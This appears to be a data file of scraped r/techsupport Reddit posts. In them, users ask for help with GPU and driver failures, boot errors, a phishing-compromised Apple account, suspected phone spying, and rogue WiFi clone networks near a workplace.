lt456l,'Broken' GPU works fine?,"Hello everyone,

A while ago my motherboard broke and took some of its parts with it. The IT repair store claimed it had broken my CPU and my GPU, so I had them replaced.

I had the Intel I5 7600K CPU and a GTX 1060 6GB. I connected these to a ASUS Prime B250M motherboard.

When these parts broke, I got a Intel I7-8700K with an Asus H370-Pro Gaming motherboard. Because of the whole chips problem I got an AMD RX 550 4GB. When I got back my PC I thought: what could go wrong trying the 'broken' GPU and seeing for myself. The store had been very vague about it and the problem they described had nothing to do with the motherboard.

I took out my RX 550 and put in the 'broken' GTX 1060 6GB, to my surprise my PC booted up with both my screens on HDMI and DisplayPort working. First I went into my BIOS, all of my drives were there and my RAM too. I went into Windows 10 and didn't click or do anything, the NVIDIA drivers were downloading and my resolution went to 1080P on both screens.

I started to check the temps and other data in taskmanager, the GPU was doing fine with about 40 degrees celcius and a max of 30% usage. I wasn't able to run Middle Earth Shadow of War in low 1080P on the new RX 550. I decided to test the 'broken' GTX 1060 on this game, I selected ultra settings and got a mindblowing 62 FPS average with my temps not exceeding their regular 70 degrees celcius.

&amp;#x200B;

So basically the IT store had told me the card made the Mobo act weird, but after about 1/1,5 hours of testing I have yet to see something thats different. The card works like it used to and the rest of the PC also does. I am looking for a way to see if the card really isn't damaged in some way and might damage other parts in my PC. I really want to know if I have been ripped of or not!

lsr4ze,If my phone has a max SD capacity of 256gb can I partition a 512gb card into 2 256gb partitions that will show up?,"# SOLVED: /u/jdayellow ""A 512GB SD card will working perfectly fine in a Galaxy S8. When the S8 was released, the technology at the time supported up to 2TB even though a card above 256GB was not commercially available which is why Samsung advertised 256GB. There is a 99.999% chance a 512GB card will work just fine on an S8. It'll probably even work on anything from an S3 to S7 too because they have the same memory technology.""

  
Hey guys, I'm sorry if this is a simple question, or if you don't do Android support, but I can't find an answer anywhere for this and I don't know where else on reddit would be a better place to ask. But I have a Samsung Galaxy S8+ and I've recently come to a point where I know I will be needing **a lot** more space, so I've been looking into my options. It seems like due to the limit on SD capacity that my phone will accept I can't get anything more than a 256gb card to read from what I understand the phone will accept. But I feel like I'm going to need a bit more than 256gb's of additional SD storage.

&amp;#x200B;

So I was wondering if anyone knew if I could get a 512gb SD card to read on a phone that limits the SD capacity to 256gb by partitioning the SD card into 2 smaller portions, or if they knew if the card would just not read period because it's actual physical capacity is indeed more than 256gb regardless of how it's partitioned to show up?

&amp;#x200B;

I could just get 2 256gb cards, but then I would have to swap them back and forth as I needed them and I thought maybe if my idea is possible I would just prefer to do that. So if anyone can clear that up for me I would be really grateful.

laaumh,"Advice needed, I fell for a phishing email.","I posted this over at the cyber security sub Reddit and was told this was the place to post. So yesterday I received an email from Apple or rather an email posing as Apple and clicked a link to change my password. I entered my Apple ID and password and was then prompted to answer my security questions but was not able to answer correctly. I realized something was up so I contacted Apple support. I tried to change the password on the Apple site and on my iPhone but on both it said I need to change the security questions. When I tried to change the security questions it said that there wasn't sufficient information to change them.

Apple support began to walk me through the steps of recovering the account but we weren't able to get very far because I was locked out of the account for 24 hours for trying too many times to change the password/security questions. I was told I would have to wait until tomorrow to try again. I haven't attempted to do anything with the account since then but last time I did try, the password still worked. I also tried to remove my card information from the account but was not able to. I used a different device to freeze the card and change my passwords for emails, bank account. I'm still signed into my iPhone with the Apple ID. It is an older IPhone, was told by Apple support yesterday that it's an IPhone 5.

I'm just looking for some advice on what to do next. I'm not a professional in this or any related field. Would really appreciate it.

Edit/Update:
Just finished my call with Apple support. We were able to change the password and turn on two factor authentication this time. I signed out of the phone and signed back in with the new credentials. Feeling slightly better I guess but still plan to do a credit freeze and cancel the card that was linked to the account. I would also like to get the phone scanned for malware, almost all of the places I called concerning this said they only do that with computers and not phones. Haven't been able to reach geek squad.

A few months back, I decided to go on a social media cleanse. Instead of deactivating my accounts, which is what I should have done, I DELETED them. The accounts being Instagram, Facebook, and Snapchat. What I failed to recognize is that in doing that, I’d lose years of photos, years of memories stretching back to 2011. And those photos weren’t precious in the moment, but hindsight is 20/20 and I’d give anything to have those photos back. 

My question is, do any tech wizards out there know of a way to restore those deleted accounts or to access those photos and videos? Every source I’ve researched online says no, that it is impossible.

So (while we're both on zoom and she's watching me call her phone) after a few rings the call is answered despite the fact that her phone did not ring at all. What played on my end was random audio of a some sort of talk or interview; it felt like just like the middle part of a conversation being played out of context. But the audio was very clear, it specifically sounded like a recording of audio being played back, not like I was hearing an actual conversation being had in real time on the other end of the line. My gf and I were shocked for a good minute or two as it continued to play and she had no call on her phone. Eventually I hung up and tried to call her again and it went through fine. We tried a couple more times and it continued to work normally. But her phone has no history of the first call. It wasn't even a scam of someone trying to sell something on the other line, but rather just a seemingly random person speaking randomly.

I have a 144hz 24' 1920x1080 monitor connected to the laptop, my resolution in Windows 10 settings is set to 1920x1080.

I remember when I was able to stream, have chrome opened and play the game at up to 160 fps, rarely it would fall to 130. If you are wondering why I use an external monitor, its because it has better refresh rate, and I have a dual monitor setup when streaming.

Now, I can only run games up to 100 fps, somethimes goes up to 110, with both Discord and Chrome closed.

This isn't the case with only one game, it is with most games (edit here: it's not that the game got updated alot and isn't greatly optimized, Terraria has received an update after 3 years of no changes). While playing, my CPU usage is 95%-100% so it shouldn't throttle that much, but that is only when I check now and then using the task manager.

What is a good monitoring software that can show me the temperatures and usages for both CPU and GPU while I am in game? And what can I do to make FPS good again?

I can delete every single program installed on my computer if that will help, but my SSD has 78.6 GB free out of 237 GB and HDD has  370 GB free out of 931 GB.

It is not due to malware, because I scanned recently

h147ve,Valorant’s Anti-Cheat (Vanguard) ruined my computer.,"Vanguard blocked my graphics drivers and then this happened

[Video of Screen: YouTube](https://youtu.be/CUrMSRGvhLs) 

My solution: Restoring to an old backup worked at first but when I went to update my graphics drivers it broke again. I had to reinstall windows in order to fix the problem.

How this happened:
I just made a Riot account today so I could start playing Valorant. I had heard of troubles with the anti-cheat but I thought I would just test it and if it broke something I would delete it. I download Valorant and go into the game to where it prompts me to download Vanguard Anti-Cheat. So I download it which requires a restart, I start up Valorant again and it says that Vanguard is blocking one of the files used in my graphics drivers (I have a rx 580) although I do not remember which file exactly. It requires another restart to block the file and to play the game. So it restarts again while blocking the file and lets me go into the game. The tutorial loads up and is unplayable because it was not detecting my graphics card due to it blocking my drivers. At this point I realized it wasn’t lost cause and I go to the Amd app to update my drivers. The app however would not start due to Vanguard blocking the one file. Instead I go to the website to download the new drivers, I start up the installer and as it usually does throughout the installation of new drivers my computer restarts however it restarts to the screen in the video above. No matter how many times I restart my computer it launches right to this screen, I cannot even access the bios or anything. Any help would be greatly appreciated.

g2bvb3,"Disable Windows DUMB features forcibly, permanently.","Is there a way to forcibly and permanently disable all ""smart"" features in Windows? 

After yesterdays update, Windows decided to autologin for me (bypassing my pincode!) and open Chrome on some random pages (I assume whatever I had open yesterday). 

I DO NOT WANT THIS, EVER! The setting for this is DISABLED (For those who don't know, and to prove I know which setting is supposed to be responsible for this: Settings &gt; Accounts &gt; Sign-in options &gt; Use my sign-in info to automatically blahblahblah...). Yes I double checked, it's still disabled right after doing exactly what that setting is supposed to prevent. 

First of all, this is a major security risk. Windows should NEVER overrule my log-in security, this effectively makes the security worthless. It's like a lock that happily opens for anyone who happens to walk by, just in case it's the owner who doesn't want to be ""inconvenienced"" by the lock which they installed themselves. 

Second of all, I don't want Windows deciding what programs should be open. I decide the programs that start up with Windows, Chrome isn't one of them. Also chrome is set to start up on a new tab, so Windows can fuck right off by overruling that and opening specific webpages. 

I **NEVER** want my OS to overrule it's own settings or that of installed applications. So is there a way to disable this behavior that some ""programmer"" probably dares to call smart? I don't mean disable the feature in settings, because obviously the ""programmer"" in question can't program a simple toggle switch. I want to permanently disable Windows' ability to autologin or autostart programs which are not in the startup list, regardless of what my settings are or how many times Microsoft decides to change or ignore them. 


Yes this post is a rant, but I also genuinely want help with this because every day Windows is driving me crazier and crazier with these idiotic decisions.",https://www.reddit.com/r/techsupport/comments/g2bvb3/disable_windows_dumb_features_forcibly_permanently/,1587029962.0,306,0.91,90,techsupport,[deleted]

g1yb15,What can employer see when I plug personal phone in to work computer on home network?," 

I plugged my iphone x in to my work computer to charge. Phone is on my home wifi. I accessed a questionable adult website. Can my employer see what I did on my personal phone while it was plugged in to the computer?

IT policy is no external storage devices. I tried when I first started working there and sure enough, nothing will function when plugged in to computer USB. As far as I can tell, all the USB cable is doing is charging my phone. I never get a message asking if I want to grant access to the device or its files.

Thoughts? As soon as I looked down and realized it was plugged in, call me crazy but I powered down my phone and yanked out the cable. For those wondering, I will no longer be using my work computer to charge my cell phone going forward.

g16wj7,"""The previous overclock settings have failed, system has been restored to it's default settings. Press F1 to enter setup. Press F2 to load default values and continue.""","Before I go any further, I should be clear: I am terrible with computers. I'll probably misuse jargon, and worse I don't know what critical information to provide. I'll put everything I can think of here.

So, ~50% of the time I restart / boot up / wake up my PC, I get a black screen with white text (before anything else appears on my monitor) that says

&gt; The previous overclock settings have failed, system has been restored to it's default settings.

&gt; Press F1 to enter setup.

&gt; Press F2 to load default values and continue.

Pressing either F1 or F2 takes me to a BIOS page of some kind; this is not my screen but here's a picture that shows what the page more-or-less looks like: https://i.imgur.com/vSJ4TbG.jpg

I have no idea what to do with any of the options so I press ESC and then quit without saving (the only way I've found of leaving this page besides unplugging my PC), at which point my PC reboots. AFAIK, all of the options are still at their default (although I doubt I'd know if they weren't).

After ESC-quitting the BIOS page, my PC reboots and one of two things happen: either the PC will boot normally, giving me access to login to my user profile, or it will return to the ""previous overclock settings have failed"" page. Sometimes this can ""chain"", where I get stuck rebooting, pressing F2, ESC-quit from BIOS, reboot, press F2, etc. etc.

This has been happening off and on for a little over a year. Like most luddites, I treat my tech problems like babies treat object permanence: ""If I ignore it, it'll go away eventually!"" And for a while, this only happened once every few weeks or months and I was able to safely ignore it. However, over the last half year, it's become increasingly common and has started chaining more frequently. This morning it repeated a half dozen times.

I did some digging around on Google and best I could find is this is some kind of hardware power problem. The one workaround I've found is to unplug my PC, deplete its internal battery by smashing that ~~like~~ ~~upvote~~ power button for 30+ seconds, and then reboot. ~2/3 of the time, this results in a normal bootup. The rest of the time, it just boots back to the ""previous overclock settings have failed"" page.

I have *never* attempted any kind of hardware modification like overclocking; wouldn't even know where to start, and besides my PC runs just fine once it's booted up. My PC hasn't crashed in over a year (the last one was summer '18, which I believe happened because it overheated; it hasn't happened again since I started pointing a fan at my PC). My storage is mostly full if that matters. I've never intentionally accessed the BIOS page or done any bootup shenanigans like ""safe mode"". This just started happening one day and I can't shake the feeling it's getting worse over time.

Oh, and it of course finally booted up fine this morning once I started typing this out, so that's why I don't have any screencaps.

At first I thought the CPU temp was the issue so I got to do some tests with afterburner. When playing one of the games that makes my pc shutdown sometimes (dark souls 3) the Temps registered by the CPU weren't at all alarming (54°C/130°F) but my GPU Temps were (85°C/185°F), so I thought that was the issue. But when I got to play the game that instantly shutdowns my computer every time I play it (PUBG) the Temps of the GPU were around 74°C/165°F before shutting down. What I noticed was the GPU load was at 100% most of the time and was at 100% when it shutdown. My GPU is an AMD Radeon 290 tri-x, and my CPU an AMD FX-8370 black edition. I was hoping someone could tell me something I'm missing.

I have a cooler master MA410M CPU cooler, it has 2x 120mm fans and full rgb lighting. I currently have this set to display colours based on its temperature. Blue being cold and going red. Fully red is around 65-70 degrees if i remember correctly. And above 75 degrees it will start flashing red.   


I've recently noticed that when the cpu cooler is red or has just started flashing that if i open up the fan manager ""system fan 5"" (gigabyte software) if shows that the cpu is only at 45 degrees and so leaves the fans at 60%. I am frequently having to manually turn the fans of the whole pc to max because it doesn't seem to think there's any heat issue when there is. after manually telling all fans to go to full speed the cpu settles down to reasonable temperatures while performing the same activity as before. (note this has become more prevalent after installing the RTX 2070 super   


Does any one know why there would be this heat discrepancy between the CPU coolers internal thermometer and the motherboards? I cant seem to find any software that will link with the cpu cooler to manage it separately.

System specs for ref:

i7 8700k @ 4.2ghz (not overclocked)

gigabyte auros b360 gaming 3 wifi with latest bios

16gb kingston hyper 2666 ddr4 ram

I’m not too tech savvy and I researched some and a couple of problems with upgrading pre-built computers is the power supply not being high enough watt and some computers not taking CPUs if they are pre-built so what would be a good wattage for say a rtx2070 and a non overclocked i7?(If I can even change the CPU)

djo6ov,Need Advice on how to revive an old laptop,"Hello everyone, I need some help to go past over some kind of weird Problem with an old laptop.

For those who will say to trash down the PC or make it a an retro gaming PC ( like win 98 /dos machine) please consider:

* This is not my PC (it's a request from my dad's friend)
* If it was mine, making It a retro gaming Notebook (Win 98 / Dos with boxed games and abandonware games) will be what I will go for to replace my old one
* The Guy that owns it is has little to no money to put on a new or refurbished PC as nearly all is money go to pay his home Loan and medical care bills
* It needs a system that can at least go to internet (The PC is nearly to be used when it stays at the hospital, and the hospital has free WiFi)

Here are the specs of the machine:

Compaq Presario R3200 with:

* AMD Athlon XP-M 3000+ ""core Dublin"" @1.6Ghz 1C/1T
* 1280MB RAM PC 2700 (256MB integrated and 1GB SODIMM Stick)
* 80GB 2.5"" IDE HDD (5400 RPM)
* Geforce 4 440 Go (part of the Nforce 2/3 chipset Package on the motherboard)
* latest Bios is installed
* A DVD drive
* USB boot is supported (Tested Ok)
* Before Cleannig the Win XP it was working normally

Here is what I have Done:

* Already passed HDT to check all the internal specs and have the list of Linux kernel module
* Already passed Memtest with no errors
* Installed LUbuntu (latest one that supports 32 bits aka 18.04.3 LTS)
* Tried to install Gentoo
* Tried to install Arch
* Tried to install latest Linux Lite OS (downloaded all the 3.x 32 bits lineup)
* Tried to install ReactOS

&amp;#x200B;

The real problem is: 

At First I tried to install the latest 32 bit Gentoo as a test and to see if I can get the most out of this hardware, but for no reason the PC sort of crashed (for easy setup I was gone ssh Style to keep my sanity in check), all the easy setup has gone good but when I compiled the kernel it gone all Wrong, after a bit the PC was near unresponsive, and the HDD status LED has gone crazy (a little before it was the CPU fan) and when I got as little as some response on the machine (not via SSh as it was impossible to connect, putty was locked on a waiting state), i could run top that nearly froze after running it and refreshing like each 20 seconds and saw that all the memory and swap where use up.

The PC run like that fore more than 18 hours (because work and sleep) and after that I gave up on installing Gentoo (before that I retried but direct on the machine as i needed place on my desktop for some work so no ssh this time and after a while this had gone the same way)

the only regret that i had is to not install ATOP before running the kernel building to see what was consuming all the RAM 

The specs of L Ubuntu are far inferior that what the PC is capable off to run, it installs but the PC at use is really sluggish and for no reason, the WiFi card was detected, the default kernel module (the same as shown in HDT) is in the module kernel directory but impossible to either detect or connect to a WiFi network as the peripheral doesn't show up.

The only way to go to internet was to have it plugged in via Ethernet cable and out of the box chromium or midori browsing was a plague and a simple YouTube video (either in 144p /240p / 360p) was running kind of smoothly but had rendering glitches. forcing the old render mode (non html5) with videos uploaded on YouTube more than 10 years ago and with an old version of iceweasel (for some kind of weird state, on old version of firefox couldn't compile)  had the same glitches

Trying the Arch route was nearly cut from the start: ip link whas showing the three interfaces : local loop / ethernet / wifi but impossible to get the network stack functional (I was using the latest dual iso (i486/i686) of Arch Linux 32) the best i could go was to force a static IP and get it to ping [8.8.8.8](https://8.8.8.8) and fighting with DNS to properly ping [www.google.fr](https://www.google.fr) but after that the installer kept saying it couldn't run because it can't connect to the server and all arch tutorials (either in ""paper"" or in ""video"" hadn't had this problems (either in the forums) and at first it said it couldn't find the installer (install or setup was not working, only having a \_setup in the ISO)

When Trying to run Linux lite OS, I only once got to have X-org to run and show me the wallpaper but nothing else (was 3.8 version, after the reboot it was dead giveaway as when trying with or without ""nomode"" and removing ""quiet splash"" it never again got x-org running staying locked on ""starting D-Bus"" 

The same problem was with all the other versions of Linux lite OS 3.x lineup and the weird thing is at least the same laptop model is listed on their hardware  database (with same specs) that was running the 3.x series lineup dating of the en of 2018 and other laptops shows with seemingly the same hardware (saw a Sony and Toshiba ones)

In the end for the Time he will be waiting with a more recent laptop (acer Travelmate 7730) I recently converted to win 10 The Pc had an Bad PSU and HDD was dead for the time I fix his laptop.

For those who will  say to sell him the travelmate: This laptop was already sold to other people in need for their son for when he will enter middle school the next year for very cheap (I don't get the full refund of what cost me the new PSU and the 320G HDD put in there as i sold it for 30 $ and only the brand new PSU cost me 17 $)

For now I wonder what route to take:

* Reinstall that security hole that are windows XP and firefox 52 ESR?
* Try to go suicidal by trying to install a light version of windows 7 /10 32 bits?
* trying to go the Debian net-install route?
* try other ""lightweight and old hardware friendly"" versions of Linux?
* Go LFS Style?

PS: I have some skills in linux but i'm not a full fledged linux user, Linux is not my main OS but mostly a for work one (I have an ubuntu VM , an laptop with easy switchable SSD for Lubuntu / Arch Linux for dev and repair purposes and i take care of several Linux embedded devices (pfsense and a Xen Server that was switched to ESXI ) and as an hobby I play with some raspberry Pi and Likes (Asus Tinker, librecomputer H5 and Banana Pi R2) either for home automation / console retrogaming / and security purposes

PS2: From The PS, is to say that i have done all i know for now and I'm going to be pissed as I alrady passed more than 3 hours of flashing USB drives with either Rufus and Etcher and broke 2 USB old  keys (read write faults) with it.

PS3: i already done after the gentoo install failure (after installing Lubuntu) this command : $ sudo badblocks -v /dev/sda10 &gt; badsectors.txt and no errors were found, and I didn't installed smartmontools as the system doesnt support smart (either tested with hwinfo and sandra 2006 when XP was install and the same with hwinfo for dos on freedos",https://www.reddit.com/r/techsupport/comments/djo6ov/need_advice_on_how_to_revive_an_old_laptop/,1571408469.0,117,0.95,60,techsupport,ddrmax386

dh7yu9,"I'm being stalked by a person who has gained root access to my computer and phone, how do I get rid of this person?","  

Late last year I noticed strange things happening on my computer, like browser tabs moving without my input and songs playing by themselves on iTunes, the mouse cursor would move by itself too. Then on my Android phone icons would move around by themselves, i'd also be browsing Reddit and the page would scroll down by itself when I was reading a post.

One time I got home and a video of a boxer training starting playing by itself on my Android phone when I got to my front door (and could reach wi-fi.) I'd have to open 2 folders on my Android phone to reach the video, then i'd have to play it. I remember I used the phone 30 minutes previous in town using the calculator to add up the price of my grocery bill, then I turned off the display. I did not go at the phone on the bus yet multiple folders were opened on the phone and a video started playing without my input. I remember one time talking to my cousin and I heard the sounds of phone numbers being pressed and a man mumbling in an odd fashion, neither me or my cousin didn't make that noise, I feel like we were being listened in.

   
 

I ended up getting rid of the computer because one day I opened up Firefox and saw ""4chan"" on the bottom left of the screen very briefly, like when you visit a website and the address pops up when you are connecting to that website. I looked at my hard drives under ""This PC"" and saw that my ""D"" drive, which previously had no files on it, had 6.3GB of data on it all of a sudden despite me downloading nothing to that drive. I felt like this person could have downloaded anything to my PC, like child porn for instance but because he had root access to my computer it would look the exact same to the authorities as me downloading it. I could get end up getting arrested over this stuff, I wouldn't be able to prove to the police that a hacker had done it. 

I ended up getting rid of the PC, the internet and the Android phone. I got a basic phone which has no internet since I thought i'd be less likely to be hacked. It is an Alcatel phone, but over the past months i've had ""Notification: Unknown Application"" appear on the screen of this basic phone, despite me having no access to the internet and the phone not having an App store. I also hear this clicking sound when I lock and unlock the phone despite me finding no option for enabling or disabling this sound in Settings. Draft messages get deleted at random too.

   
 I communicate with my cousin often and I feel like the hacker was able to send malware to his smartphone from mine, and when my cousin and &amp; I sent texts to each other the hacker could somehow get access to my Alcatel phone (SOMEHOW) despite me having no internet and the phone not being a smartphone. 

I was thinking of getting the internet back on at home, getting a laptop and then formatting the hard drive whenever I notice suspicious activity but I read that malware can be installed on a router and you'd have to replace the route to get rid of the malware. Or what if my cousin visited and he connected to my wi-fi, the malware from his phone could infect my router. I am thinking of going to the Police since this person hacking my computer and phone is a crime but I read that hackers are practically invisible so I feel like this would be a waste, I feel like i'm being held hostage.",https://www.reddit.com/r/techsupport/comments/dh7yu9/im_being_stalked_by_a_person_who_has_gained_root/,1570955777.0,462,0.93,47,techsupport,PacMan127
dgnpgj,Google Pay is holding over $2000 of my money hostage!," 

I've been a huge fan of Google up until now; I bought 3 Pixel phones, converted my GF into using Pixel (from iPhone), I have the Pixelbook, and every room has a Google Home or Mini. I even paid to be a Stadia Founder. My GF and I bought a house together and decided to furnish it together as well. She bought over $4,000 worth of furniture, and I sent her something like $2280.58 via Google Pay. She wasn't able to claim the money. We spent hours talking to customer support and each time they swore they would fix it ""in 24 hours."" Finally, we decided to try and send the money back to me, and now I'm not able to re-claim the money I sent to her! We both get a message saying that fraudulent activity has been detected, but each time we call customer support, they swear it'll get resolved (""in 24 hours"").

I've lost count of how many times I've called customer support only to repeat the same thing over again and have them swear it'll get fixed. This nightmare started September 28 and it's now October 11. I'm wondering if going to a lawyer might be the only way to get it back by getting their attention, but I know they can afford a team of the best lawyers and I'm lucky if I can even get someone that knows corporate law.

I had a really low-end DVD player and decided to upgrade recently. This broken outline problem was also on my last DVD player so I’m starting to think it’s a TV setting but then I feel like it should also be causing the same problem with YouTube. 

I thought it might be a Progressive Scan issue but that doesn’t seem to be it either because the new DVD player has an option for Progressive and Interlaced but both look kind of shit

Watching live-action movies/TV doesn’t seem to be a problem, or at least not noticeably so but this issue is one in every couple of frames (especially during lots of action) of a traditionally animated film/TV show

d8mjoe,Driver update caused bsod loop?,"****
MOST RECENT UPDATE HERE

in device manager, I can see the onboard intel graphics chip. I can't see my nvidia card, which I had been able to see until yesterday when I installed the new drivers. I COULD however see an unkownn 3d video controller in ""other devices""

I tried uninstalling the unknown 3D video device and then rebooting, caused windows to try and redownload and install the nvidia drivers which resulted in the nvlddmkm bluescreen. I tried using manually installing the drivers myself from nvidia's website, 5% of the way into the installation I got the same bsod

I assume this means I have a failing nvidia card and will have to forever rely on the intel graphics?

****

new edit:

okay it's not completely fixed. i had the same blue screen (specifying nvlddmkm.sys as the issue) come up while watching a video but fortunately i didn't get stuck in a loop and am in fact posting from said laptop.

BUT my mx150 nvidia card isn't detected by my laptop and the windows updates for nvidia drivers always fail to install when trying them through windows automatic updates 

Should I try creating a restore point and installing the drivers manually (a failed nvidia driver update is the original cause of this whole post) or just be content with what I have and not risking breaking things again?

and is there any way to figure out why my mx150 card isn't showing up? could that just be because I have literally 0 nvidia drivers installed?

****
*fixed-ish*


Well not really fixed, but I did a clean install using a thumb drive, formatting the hdd and everything. Hopefully all that manufacturer app junk is nothing but junk.

ORIGINAL POST

I have an Acer aspire e15 laptop, with Windows 10. Using the GeForce Experience app (my biggest regret) I allowed the app to download and install new drivers. Upon resetting the laptop to finish the installation I get bsod loops. The error page says 

""Your PC ran into a problem and needs to restart. We're just collecting some error info, then we'll restart for you.

Stopcode: page fault in nonpaged area 

What failed: nvlddmkm.sys""

Then the laptop will restart, the Acer logo shows up for a few seconds and we go back to the error screen. I know that you're supposed to be able to active start up recovery mode by powering off several times during boot sequence but it doesn't work. I left the laptop running for an hour hoping it would kick itself into recovery mode but still I just get the same error.

My hope is to somehow get into the recovery options and get into safe mode so I can undo the damage caused by Nvidia.

Any suggestions? I've also tried letting the battery run out, I've tried hitting battery reset button, I've tried the interrupt boot sequence trick, nothing. And of course the f8 hotkey for safe mode is disabled because this is windows 10.",https://www.reddit.com/r/techsupport/comments/d8mjoe/driver_update_caused_bsod_loop/,1569328544.0,50,0.95,23,techsupport,redmoqorro

Many of the unsubscribe links in these emails send you to a similar looking page. I'm not familiar with services like MailChimp, maybe they look similar because they're using similar mail services.

d76aaa,mom spying on my phone?,"I found this folder in my files of my Samsung S10 called aweme\_monitor. It is just an empty folder with nothing in it. When I first got my phone my battery was dying super fast but its fine now.... My mom said some stuff today that made me super suspicious that she can see what I'm texting to people. Is this a spy app or something how can I check?

Edit: (rewrote this whole thing on my computer, was on phone before and awful)

Summary of this I've been depressed for a long time it has recently gotten worse because I broke up with my gf a few months ago and my dad was recently diagnosed with leukemia and is going to die soon. Mom asked me why I didn't have anyone to go out with this weekend (I had been dating a girl and going out with her on weekends but she ghosted me all of a sudden) and then when I told my mom that I didn't have anyone to go out with she said something like ""oh are you guilting her into hanging out with you by saying your going to kill yourself"" Which is obviously a super weird thing to say without knowing anything. No I don't guilt people or force them to do anything by threatening suicide..But I had been talking to people about my feelings and suicide so maybe that's why mom would have brought it up if she had been seeing my texts. Thanks to the people who reached out and talked to me but I really do have people I can talk to already.  I'm really never going to kill myself unless some really bad stuff happens to me all at once; for now I want to live long enough to see sum aliens LMAO(really though I know I will be happy one day, I want to have a family and a beautiful wife one day). I would also like to defend my mom I guess I made her out to be a crazy lady but she is my best friend and favorite person in the world and I kind of doubt she would be spying on me in the first place although she is a very nosy person...I think its possible that she just knows so much about me, she is my mom after all, that she could just tell I have been depressed since she knows I have a lot going on and was just worried about me.

d6i4w2,Huge GPU RX 580 performance decrease after BIOS + Drivers + Chipset update,"Hello there, I'm having an extremely poor performance on my RX 580 since  yesterday, when I had a few problems trying to stream Wolfenstein II  with Discord's new feature ""Go Live"".   
 First things first, this is my setup:  
 

CPU: Ryzen 5 2600  
 GPU: MSI Radeon RX 580 8gb  
 RAM: QUMOX 16gb (8x2) DDR4 2400MHz   
 MOBO: Asus TUF Gaming B450 Plus  
 OS: Windows 10 Pro 1903 18362.356  
 PSU: Corsair CX450  
 

I've had this build for a lot of time now, never really had any problems  with it. The only issue I remember having was streaming games either on  twitch or mixer, which was basically impossible, since either the  streaming was stuttering and my game wasn't, or the game simply kept  stuttering and so did my stream. Anyways yesterday I wanted to stream  Wolfenstein II to a friend on Discord with the Go Live feature but as  soon as I started the streaming and did ALT+TAB back to the game my  computer would instantly BSOD with atikmdag.sys failing with  SYSTEM\_THREAD\_EXCEPTION\_NOT\_HANDLED.  
 I wanted to fix this issue so bad that I first checked for a new drivers  version (I hadn't updated my drivers to the last version yet, I still  had the ones from back in June 2019). I updated to 19.9.2 but nothing  changed, still BSOD. I tried different fixes, went to Radeon Settings  Global Wattman and changed Power Limit to +50% but nothing changed, same  error. So I went on further and looked for Chipset drivers, I installed  them, tried again, didn't work, checked for BIOS updates, installed it,  didn't work. So after spending a few hours without results, I decided  to use (stupidly) AMD's cleanup utility, and went ahead and removed my  drivers in Safe Mode. So then I reinstalled the GPU's drivers again, I  tried both 19.9.2 and an old version as well which wasn't optional, but  still same issue with the BSOD trying to stream. I read on a forum about  verifying those drivers with windows' verify, so I did, but nothing  changed.   
 So I reinstalled the drivers again with AMD's cleanup utility, I tried  one more time but didn't work. So I decided that it was the app's fault  and deleted it. I then downloaded DDU, used it to delete the current  drivers, tried again but still didn't work. So I went ahead and decided  to give Windows Update a shot, since I still had Windows April 2018  build. I updated everything to Windows 10 1903 build, I once again  uninstalled and reinstalled GPU drivers, still no change. I decided to  give up and just play the game, but I then noticed that it started  running really  badly. Before it ran at 120+ fps at default settings  (Ultra or High, I don't remember). Now I can't get past 65/70 fps! Also  changing game settings doesn't really influence the fps that much. I  disabled windows' fast boot. I ran a stress test to both GPU and PSU, I  also looked for errors, but nothing really. I finally did an  userbenchmark test, and where my CPU runs quite average, my GPU runs way  below average! I don't know what to do now, I also tried metro 2033  redux, before I could play it really smooth at 150+ fps, now it's a very  laggy 120 fps with stuttering feeling...  
 I NEVER OC'd any of my components, you might think the PSU is the issue  but I assure you it's not, RAM neither, I did a memcheck some time ago  and everything was alright.   
 Yesterday I also left my pc restarting inbetween all the driver  reinstalls, and when I came back I noticed it froze and my mouse wasn't  visible, as soon as I started spamming a few keys of my keyboard it  restarted.   
 BIOS doesn't do any error beeps, and I tried to check for GPU settings  but there is none since Ryzen doesn't have integrated graphics.  
 

Tl;dr I reinstalled my GPU drivers at least 10 times, updated chipset  and BIOS, and now I find myself with an underperforming way below  average GPU...  
 I really don't want to format my PC, I have 3TB of stuff that I don't  have time nor want to backup. That would really  be my last resort.  Thank you if you'll ever decide to help me

EDIT AND SOLVED
I want to thank everyone who helped me! I finally found a solution after everything we tried, I simply had to ""install"" the same bios update once again with ezflash3. The bios would fix itself. Now everything works greatly again, I can finally get back to enjoying 140fps Wolfenstein 2. 

P.S= even though the PCI-E remained 8x and not 16x the performance is good anyway, and I don't think it would increase even with 16x due to the fact of it being already Gen3.",https://www.reddit.com/r/techsupport/comments/d6i4w2/huge_gpu_rx_580_performance_decrease_after_bios/,1568917602.0,98,0.98,55,techsupport,oslo_1
d68gi9,How can iTunes change the background music on a tv show I purchased years ago?,"Sorry, I’m not sure if this is the right place to ask this, but recently I’ve played two different tv shows from my iTunes library that I purchased from iTunes 10+ years ago and the songs in them have changed. One went from well-known pop songs to just non-copyrighted grocery store sounding music and the other completely just deleted all of the music, there is literally just empty silence during scene transitions and all background is gone. 

These shows are from two different networks, one was reality and one was scripted. The only thing they have in common is I purchased them from iTunes and they’re both over 10 years old. How is this legal? I bought the shows to enjoy the way they were made and originally aired and now I can’t even watch one because it’s too awkward watching a silent tv show (it’s a cheesy MTV teen show that relied heavily on music and sound effects). If I physically went to Best Buy in 2007 and bought the season of tv shows on DVD the songs wouldn’t change, so what right does iTunes have to change them now? And without informing me? It just sounds wrong that they can reach into my library and change something I own.

d5umb3,How to report a likely honeypot operation taking place near my place of work?,"I work at a business that is located in a strip mall and over the last few years, I've noticed that there is an insane amount of wireless networks all with excellent signal strength, usually between -40 to -55dBm.  What got me suspicious is that these wireless networks are almost all clones of customers and staff WiFi SSID's, including mine and even friends and family who have come into my place of work.  I felt something was amiss but I didn't feel confident in trying to solve it, so I just never really looked into it any further.  However, I had an itch to check it out again recently and used a WiFi analyzer on my phone to see if I could discover anything and I'm fairly certain that what's going on is a honeypot operation.

Viewing the analyzer, all the rogue networks have the same MAC address and interestingly, one of the SSID's is called ""Pineapple\_XXX"" with the X's representing the 6th octet of the MAC address all the rogue networks have (Note: It's not actually XXX, but I'm just currently paranoid so I didn't want to put the actual octet).  I decided to look up what a pineapple was and it turns out, it's a pentest tool used to test network vulnerabilities.  The company that makes them is called Hak5 and upon reviewing their devices, it seems it's a pretty popular and relatively easy to use tool to exploit networks.

